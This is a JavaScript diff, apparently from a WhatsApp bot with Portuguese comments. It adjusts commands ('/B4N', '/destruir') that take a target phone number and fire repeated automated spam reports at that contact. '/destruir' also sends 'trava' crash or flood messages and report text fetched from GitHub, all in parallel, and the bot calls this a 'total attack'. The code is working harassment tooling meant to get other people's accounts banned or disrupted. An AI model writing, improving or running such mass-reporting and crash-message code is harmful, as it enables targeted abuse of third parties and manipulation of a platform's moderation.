@@ -342,21 +342,22 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias oficiais de spam para o contato \`${alvoNum}\` (${quantidade} ciclos)...` });
+                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias nativas de contato para \`${alvoNum}\` (${quantidade} ciclos)...` });
 
                 for (let i = 1; i <= quantidade; i++) {
                     try {
                         await waSock.chatModify({
                             reportSpam: true,
-                            delete: true
+                            delete: true,
+                            spam: true
                         }, jidAlvo, {
                             fromMe: false,
                             remoteJid: jidAlvo
-                        }).catch(() => {});
-                        await delay(800);
+                        });
+                        await delay(700);
                     } catch (err) {}
                 }
-                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias oficiais /B4N para \`${alvoNum}\` finalizado!` });
+                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias nativas /B4N para \`${alvoNum}\` finalizado!` });
             }
             else if (texto.startsWith('/B4NGRUPO ')) {
                 const linkGrupo = texto.replace('/B4NGRUPO', '').trim();
@@ -428,7 +429,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
 
                 await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 5 grupos!` });
             }
-            // COMANDO DESTRUIR TOTAL (TRAVA + DENÚNCIA DE CONTATO + FEEDBACK DO GITHUB)
+            // COMANDO DESTRUIR TOTAL (TRAVA + DENÚNCIA NATIVA DE CONTATO + FEEDBACK DO GITHUB)
             else if (texto.startsWith('/destruir ')) {
                 const partes = texto.replace('/destruir', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -441,7 +442,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
 
-                await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas, denúncias de contato e feedback do GitHub simultaneamente..._` });
+                await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas, denúncias nativas e feedback do GitHub simultaneamente..._` });
 
                 // 1. Carrega a trava local (Trava.txt)
                 let conteudoTrava = "⚡ [ZRX-DESTRUCTION] Alvo sob ataque total!";
@@ -451,7 +452,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     if (lido.length > 0) conteudoTrava = lido;
                 }
 
-                // 2. Carrega o texto de feedback/denúncia direto do GitHub
+                // 2. Carrega o texto de feedback direto do GitHub
                 const urlTextoGitHub = "https://raw.githubusercontent.com/SEU_USUARIO/SEU_REPO/main/feedback.txt";
                 let textoFeedbackGitHub = await consultarAPI(urlTextoGitHub);
                 let baseFeedback = textoFeedbackGitHub?.resultado || textoFeedbackGitHub;
@@ -469,13 +470,14 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
-                // Tarefa 2: Aciona o report/denúncia de contato nos servidores do WhatsApp
-                const tarefaDenunciaContato = (async () => {
+                // Tarefa 2: Aciona a denúncia nativa de contato (botão de denunciar dos três pontos)
+                const tarefaDenunciaNativa = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
                             await waSock.chatModify({
                                 reportSpam: true,
-                                delete: true
+                                delete: true,
+                                spam: true
                             }, jidAlvo, {
                                 fromMe: false,
                                 remoteJid: jidAlvo
@@ -502,7 +504,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 })();
 
                 // Executa as três tarefas em paralelo absoluto
-                await Promise.all([tarefaTrava, tarefaDenunciaContato, tarefaFeedbackGithub]);
+                await Promise.all([tarefaTrava, tarefaDenunciaNativa, tarefaFeedbackGithub]);
 
                 await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total ao número \`${alvoNum}\` finalizado com sucesso!` });
             }
